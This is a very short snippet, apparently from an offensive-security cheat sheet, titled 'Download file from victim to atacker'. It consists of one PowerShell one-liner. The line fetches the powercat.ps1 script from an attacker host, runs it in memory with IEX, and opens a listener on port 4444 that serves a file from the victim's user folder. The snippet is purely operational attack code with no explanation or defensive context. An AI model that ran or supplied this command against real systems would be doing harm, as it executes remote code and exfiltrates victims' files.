Download file from victim to atacker
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.1/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoDownload"
